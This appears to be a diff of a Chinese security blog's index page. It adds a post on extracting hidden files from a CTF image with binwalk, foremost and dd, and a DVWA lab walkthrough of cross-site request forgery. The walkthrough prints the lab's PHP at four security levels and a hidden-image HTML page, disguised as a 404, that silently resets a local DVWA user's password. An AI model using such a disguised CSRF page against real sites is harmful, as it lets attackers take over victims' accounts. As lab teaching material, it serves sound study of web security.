@@ -134,6 +134,106 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
+  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
+<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
+<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
+<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
+<p>像这张图片，发现隐藏着flag.txt</p>
+<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
+<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
+<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
+<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
+<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
+<p><strong>if</strong>：要提取分离的文件</p>
+<p><strong>of</strong>：输出的文件</p>
+<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
+<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
+<hr>
+<p>这篇文章只做简单的介绍</p>
+<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BugKuCTF—杂项题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -345,106 +445,6 @@
 
 
   
-    <article id="post-BugKuCTF—利用Kali分离图片中的隐藏文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/" class="archive-article-date">
-  	<time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件</p>
-<p>而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：<strong>Binwalk、dd、foremost</strong>，于是便去了解</p>
-<h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>可以借用BUGKU中的这道题，题目地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip</span><br></pre></td></tr></table></figure>
-<h3 id="一、Binwalk"><a href="#一、Binwalk" class="headerlink" title="一、Binwalk"></a>一、Binwalk</h3><p>Binwalk会分析一张指定的图片</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-7.png" alt="6-7"></p>
-<p>像这张图片，发现隐藏着flag.txt</p>
-<p>Binwalk也可以做提取工作，加一个 -e 参数就可以了</p>
-<p>不过也会出差错，最好和foremost、dd结合起来提取更完整的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e ada.jpg</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="二、foremost"><a href="#二、foremost" class="headerlink" title="二、foremost"></a>二、foremost</h3><p>foremost工具是用来分离出图片中隐藏的文件，举上面的栗子</p>
-<p>我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离</p>
-<p>它会在当前目录下生成一个<strong>output</strong>文件夹，分离出来的文件放在里面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost ada.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-3.png" alt="6-3"></p>
-<h3 id="三、dd"><a href="#三、dd" class="headerlink" title="三、dd"></a>三、dd</h3><p>dd工具也是用来分离的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=ada.jpg of=ada.zip skip=218773 bs=1</span><br></pre></td></tr></table></figure>
-<p><strong>if</strong>：要提取分离的文件</p>
-<p><strong>of</strong>：输出的文件</p>
-<p><strong>skip</strong>：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定</p>
-<p><strong>bs</strong>：设置每次读写块的大小为1个字节</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/6-8.png" alt="6-8"></p>
-<hr>
-<p>这篇文章只做简单的介绍</p>
-<p>如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF杂项</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-DVWA 3-Cross Site Request Forgery（CSRF跨站脚本伪造）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -465,7 +465,29 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2>
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\csrf\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>更改当前用户的密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-1.png" alt="3-1"></p>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从源码可以看出来，对<code>原密码($pass_conf)</code>和<code>新密码($pass_new)</code>没有任何的过滤，只是简单地判断一下是否相等，如果相等，就更改当前用户的密码</p>
+<p>我们先提交一次，来看一下结果</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-2.png" alt="3-2"></p>
+<p>从抓取到的结果来看，修改密码的请求是通过<code>GET</code>方式发出的，那就意味着只要构造一个URL，并且让受害者点击访问，就可以更改受害者的账号密码，但是这种方式很明显，懂一些安全知识的人一眼就看出来了，甚至懂英语的就能看出来，所以是不可行的</p>
+<p>那我们就还可以用一些比较隐蔽的方法，比如写一个<code>HTML页面</code>，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=999&amp;password_conf=999&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure>
+<p>Ps：<code>style=&quot;display:none;&quot;</code>是为了不让这个<code>img</code>元素显示出来，让受害者不知不觉地受到攻击</p>
+<p>写完之后访问一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-3.png" alt="3-3"></p>
+<p>再次回到登录平台尝试原本的密码，登录失败，密码换成999才成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/3-4.png" alt="3-4"></p>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Checks to see where the request came from</span></span><br><span class="line">	<span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get input</span></span><br><span class="line">		$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">		$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do the passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">			<span class="comment">// They do!</span></span><br><span class="line">			$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">			$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Update the database</span></span><br><span class="line">			$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">			$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for the user</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Issue with passwords matching</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		$insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">		$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$pass_curr = $_GET[ <span class="string">'password_current'</span> ];</span><br><span class="line">	$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">	$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Sanitise current password input</span></span><br><span class="line">	$pass_curr = stripslashes( $pass_curr );</span><br><span class="line">	$pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">	$pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check that the current password is correct</span></span><br><span class="line">	$data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">	$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">	$data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">	$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">	<span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// It does!</span></span><br><span class="line">		$pass_new = stripslashes( $pass_new );</span><br><span class="line">		$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">		$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update database with new password</span></span><br><span class="line">		$data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
       
 
       
@@ -539,6 +561,8 @@
     <div class="article-entry" itemprop="articleBody">
       
